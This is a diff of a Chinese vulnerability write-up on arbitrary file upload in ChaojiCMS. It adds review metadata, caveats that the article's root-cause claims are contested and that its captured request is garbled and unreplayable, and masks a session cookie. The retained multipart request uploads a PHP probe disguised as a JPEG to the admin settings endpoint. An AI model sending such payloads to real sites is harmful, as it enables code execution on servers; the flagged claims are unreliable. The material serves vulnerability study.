@@ -1,6 +1,43 @@
 ---
 source: "MrWQ/vulnerability-paper"
+product: "超级CMS/ChaojiCMS versionunspecified"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "超级CMS任意文件上传漏洞剖析"
+prerequisites: "来源所述条件，未列明部分仍待核：adminlogin,input_tokensessionmatch; uploadwrite/PHPexecute; lastfilenameextensiontrusted"
+side_effects: "未执行；本文需注意的操作影响：uploadFile对'.'+url落盘与file_exists(url)检查前缀不同需核工作目录；没有版本/官方修复"
+source_status: "recorded"
+source_url: "https://mp.weixin.qq.com/s/Gbj8kLVK6RafidetSb67xQ"
+id: "vw-a332997b8f3e6af36c37ba1f"
+entity_id: "ve-a332997b8f3e6af36c37ba1f"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：adminlogin,input_tokensessionmatch; uploadwrite/PHPexecute; lastfilenameextensiontrusted
+
+- **证据待核（1）**：文字称取第一个点后扩展，代码明确exts\[count-1\]取最后一段，根因是没有扩展白名单，不是取错点。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。
+
+- **适用与权限边界（2）**：strpos(ext,'?')&gt;=0把false当0会始终进入，在无?时仍返回原扩展，非文章所述双扩展绕过必要条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **结论使用边界（3）**：全部源码/HTTP被反引号连成一行，multipart多处name/filename丢失，input_token字段也消失，无法重放。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **适用与权限边界（4）**：示例API账户token、默认口令应脱敏/注明公开lab，不能用于实际系统。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **事实待核（5）**：uploadFile对'.'+url落盘与file_exists(url)检查前缀不同需核工作目录；没有版本/官方修复。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # 超级CMS任意文件上传漏洞剖析
 
@@ -206,7 +243,7 @@ define('UPLOAD_PATH_IMG', '/static/upload/image/'.date('Ymd').'/');
   
 
 ```
-`POST /supre/index.php?admin-master-webset-setweb HTTP/1.1``Host: 127.0.0.1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``Content-Type: multipart/form-data; boundary=---------------------------4629155813243096858546315035``Content-Length: 15605``Origin: http://127.0.0.1``Connection: close``Referer: http://127.0.0.1/supre/index.php?admin-master-webset-setweb``Cookie: PHPSESSID=55dpjfg85aa4b134j2b5lk8mu6``Upgrade-Insecure-Requests: 1``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `8d6dc35e506fc23349dd10ee68dabb64``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_name]"``帅哥的网站``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_url]"``http://127.0.0.1/supre/``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_dir]"``/supre/``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_index]"``index.html``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `Content-Type: image/jpeg``<?php phpinfo();?>``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_copyright]"``copyright © 2007-2018 www.chaojicms.com 版权所有``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_tongji]"``12``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_icp]"``湘ICP备16014093号-2``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_title]"``超级CMS演示站点``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_keywords]"``超级CMS,CMS,懂网站优化的系统``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_description]"``超级CMS内容管理系统（以下简称产品）由SEO研究中心为了解决网站优化问题而研发的一套产品，本产品采用面向对象方式自助研发的MVC框架开发，它是一款高效开源的内容管理系统，产品基于PHP+MYSQL架构，可运行在Windows、Linux、MacOSX、Solaris等各种平台上``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[home_title]"``首页``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_email]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_qq]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_tel]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_phone]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_fax]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_address]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_worktime]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_kouhao]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_aboutus]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `Content-Type: application/octet-stream``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[soft_user]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[soft_token]"``-----------------------------4629155813243096858546315035--`
+`POST /supre/index.php?admin-master-webset-setweb HTTP/1.1``Host: 127.0.0.1``User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0``Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Accept-Encoding: gzip, deflate``Content-Type: multipart/form-data; boundary=---------------------------4629155813243096858546315035``Content-Length: 15605``Origin: http://127.0.0.1``Connection: close``Referer: http://127.0.0.1/supre/index.php?admin-master-webset-setweb``Cookie: PHPSESSID=55d************************************************ts: 1``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `8d6dc35e506fc23349dd10ee68dabb64``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_name]"``帅哥的网站``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_url]"``http://127.0.0.1/supre/``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_dir]"``/supre/``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_index]"``index.html``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `Content-Type: image/jpeg``<?php phpinfo();?>``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_copyright]"``copyright © 2007-2018 www.chaojicms.com 版权所有``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_tongji]"``12``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_icp]"``湘ICP备16014093号-2``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_title]"``超级CMS演示站点``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_keywords]"``超级CMS,CMS,懂网站优化的系统``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[seo_description]"``超级CMS内容管理系统（以下简称产品）由SEO研究中心为了解决网站优化问题而研发的一套产品，本产品采用面向对象方式自助研发的MVC框架开发，它是一款高效开源的内容管理系统，产品基于PHP+MYSQL架构，可运行在Windows、Linux、MacOSX、Solaris等各种平台上``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[home_title]"``首页``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_email]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_qq]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_tel]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_phone]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_fax]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_address]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_worktime]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_kouhao]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[web_aboutus]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data;` `Content-Type: application/octet-stream``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[soft_user]"``-----------------------------4629155813243096858546315035``Content-Disposition: form-data; name="dsw[soft_token]"``-----------------------------4629155813243096858546315035--`
 ```
 
   
